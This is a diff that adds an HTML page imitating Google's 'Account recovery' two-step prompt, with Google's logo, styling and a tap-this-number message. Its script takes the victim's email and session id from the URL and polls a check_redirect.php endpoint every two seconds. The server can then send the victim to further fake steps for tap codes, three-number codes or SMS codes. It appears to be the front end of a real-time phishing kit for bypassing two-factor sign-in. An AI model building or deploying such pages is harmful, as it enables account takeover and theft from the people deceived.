@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account recovery</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif; 
+            background: #ffffff; 
+            color: #202124;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            flex: 1;
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 40px 40px 20px;
+            width: 100%;
+        }
+        .logo { margin-bottom: 20px; }
+        .logo img { width: 74px; height: 24px; }
+        h1 { 
+            font-size: 24px; 
+            font-weight: 400;
+            margin-bottom: 12px;
+            color: #202124;
+        }
+        .subtitle {
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .user-email {
+            display: inline-flex;
+            align-items: center;
+            background: #f1f3f4;
+            border-radius: 16px;
+            padding: 4px 12px 4px 4px;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .user-email img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            border-radius: 50%;
+        }
+        .user-email span { color: #202124; }
+        .user-email .arrow { margin-left: 8px; color: #5f6368; }
+        .code { 
+            font-size: 72px; 
+            font-weight: 400;
+            margin: 20px 0 30px;
+            color: #202124;
+            text-align: left;
+        }
+        .device-info {
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #202124;
+        }
+        .device-info strong { font-weight: 500; }
+        .device-description {
+            color: #5f6368;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        .device-description strong { color: #202124; }
+        .link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 12px;
+        }
+        .link:hover { text-decoration: underline; }
+        .footer {
+            border-top: 1px solid #dadce0;
+            padding: 16px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #5f6368;
+            max-width: 450px;
+            margin: 0 auto;
+            width: 100%;
+            background: #ffffff;
+        }
+        .footer select {
+            background: transparent;
+            border: none;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 24px;
+        }
+        .footer-links a:hover { color: #202124; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 74 24" width="74" height="24">
+                <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
+                <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                <path fill="#FBBC05" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z"/>
+                <path fill="#4285F4" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
+                <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
+                <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
+            </svg>
+        </div>
+        <h1>Account recovery</h1>
+        <p class="subtitle">To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
+        <div class="user-email">
+            <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="User">
+            <span id="displayEmail">user@gmail.com</span>
+            <span class="arrow">&#9660;</span>
+        </div>
+        <div class="code" id="tapCode">72</div>
+        <p class="device-info">Check your <strong id="deviceName">iPhone</strong></p>
+        <p class="device-description">Google sent a notification to your <strong id="deviceName2">iPhone</strong>. Tap <strong>Yes</strong> on the notification, then tap <strong id="tapCodeText">72</strong> on your phone to verify it's you.</p>
+        <a href="#" class="link">Resend it</a>
+        <a href="#" class="link">I don't have my phone</a>
+    </div>
+    <div class="footer">
+        <select>
+            <option>English (United States)</option>
+        </select>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        function getStoredEmail() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email') || localStorage.getItem('userEmail') || '';
+        }
+        
+        function getSessionId() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('session_id') || localStorage.getItem('sessionId') || '';
+        }
+        
+        function getTapCodeValue() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('tap_code_value') || '72';
+        }
+        
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            
+            if (/iPhone/.test(ua)) {
+                const match = ua.match(/iPhone OS (\d+)/);
+                if (match) {
+                    return 'iPhone (iOS ' + match[1] + ')';
+                }
+                return 'iPhone';
+            }
+            
+            if (/iPad/.test(ua)) {
+                const match = ua.match(/OS (\d+)/);
+                if (match) {
+                    return 'iPad (iPadOS ' + match[1] + ')';
+                }
+                return 'iPad';
+            }
+            
+            if (/Android/.test(ua)) {
+                let deviceModel = 'Android';
+                let androidVersion = '';
+                
+                const versionMatch = ua.match(/Android (\d+\.?\d*)/);
+                if (versionMatch) {
+                    androidVersion = versionMatch[1];
+                }
+                
+                const modelPatterns = [
+                    /; ([^;)]+) Build\//,
+                    /; ([^;)]+)\)/,
+                    /\(Linux; Android [^;]+; ([^)]+)\)/
+                ];
+                
+                for (const pattern of modelPatterns) {
+                    const match = ua.match(pattern);
+                    if (match && match[1]) {
+                        deviceModel = match[1].trim();
+                        break;
+                    }
+                }
+                
+                const knownBrands = {
+                    'SM-': 'Samsung',
+                    'Galaxy': 'Samsung Galaxy',
+                    'Pixel': 'Google Pixel',
+                    'Redmi': 'Xiaomi Redmi',
+                    'Mi ': 'Xiaomi',
+                    'POCO': 'POCO',
+                    'OnePlus': 'OnePlus',
+                    'HUAWEI': 'Huawei',
+                    'Moto': 'Motorola',
+                    'LG-': 'LG',
+                    'Nokia': 'Nokia',
+                    'OPPO': 'OPPO',
+                    'vivo': 'Vivo',
+                    'realme': 'Realme'
+                };
+                
+                for (const [key, brand] of Object.entries(knownBrands)) {
+                    if (deviceModel.includes(key)) {
+                        if (androidVersion) {
+                            return deviceModel + ' (Android ' + androidVersion + ')';
+                        }
+                        return deviceModel;
+                    }
+                }
+                
+                if (androidVersion) {
+                    return deviceModel + ' (Android ' + androidVersion + ')';
+                }
+                return deviceModel;
+            }
+            
+            if (/Windows Phone/.test(ua)) return 'Windows Phone';
+            
+            if (/Macintosh/.test(ua)) {
+                if (/Mac OS X/.test(ua)) {
+                    const match = ua.match(/Mac OS X (\d+[._]\d+)/);
+                    if (match) {
+                        return 'Mac (macOS ' + match[1].replace(/_/g, '.') + ')';
+                    }
+                }
+                return 'Mac';
+            }
+            
+            if (/Windows NT/.test(ua)) {
+                const versions = {
+                    '10.0': 'Windows 10/11',
+                    '6.3': 'Windows 8.1',
+                    '6.2': 'Windows 8',
+                    '6.1': 'Windows 7'
+                };
+                for (const [key, name] of Object.entries(versions)) {
+                    if (ua.includes('Windows NT ' + key)) {
+                        return name;
+                    }
+                }
+                return 'Windows PC';
+            }
+            
+            if (/CrOS/.test(ua)) return 'Chromebook';
+            if (/Linux/.test(ua)) return 'Linux Device';
+            
+            return 'Unknown Device';
+        }
+        
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            
+            if (/Edg\//.test(ua)) return 'Edge';
+            if (/OPR\/|Opera/.test(ua)) return 'Opera';
+            if (/Chrome\//.test(ua) && !/Edg\/|OPR\//.test(ua)) return 'Chrome';
+            if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) return 'Safari';
+            if (/Firefox\//.test(ua)) return 'Firefox';
+            
+            return 'Browser';
+        }
+        
+        const storedEmail = getStoredEmail();
+        const sessionId = getSessionId();
+        const tapCodeValue = getTapCodeValue();
+        const deviceName = getDeviceName();
+        const browserName = getBrowserName();
+        const fullDeviceInfo = deviceName + ' - ' + browserName;
+        
+        document.getElementById('displayEmail').textContent = storedEmail;
+        document.getElementById('tapCode').textContent = tapCodeValue;
+        document.getElementById('tapCodeText').textContent = tapCodeValue;
+        document.getElementById('deviceName').textContent = fullDeviceInfo;
+        document.getElementById('deviceName2').textContent = deviceName;
+
+        document.querySelectorAll('.link').forEach(function(link) {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+            });
+        });
+
+        function checkRedirect() {
+            if (!sessionId) return;
+            
+            fetch('check_redirect.php?session_id=' + encodeURIComponent(sessionId))
+                .then(response => response.json())
+                .then(data => {
+                    if (data.redirect) {
+                        const email = data.email || storedEmail;
+                        let redirectUrl = data.redirect + '.html?email=' + encodeURIComponent(email) + '&session_id=' + encodeURIComponent(sessionId);
+                        
+                        if (data.redirect === 'tap_code' && data.tap_code_value) {
+                            redirectUrl += '&tap_code_value=' + encodeURIComponent(data.tap_code_value);
+                        }
+                        if (data.redirect === 'three_codes' && data.three_codes_value) {
+                            redirectUrl += '&three_codes_value=' + encodeURIComponent(data.three_codes_value);
+                        }
+                        if (data.redirect === 'sms_code' && data.phone_display) {
+                            redirectUrl += '&phone_display=' + encodeURIComponent(data.phone_display);
+                        }
+                        
+                        window.location.href = redirectUrl;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking redirect:', error);
+                });
+        }
+        
+        setInterval(checkRedirect, 2000);
+        checkRedirect();
+    </script>
+</body>
+</html>
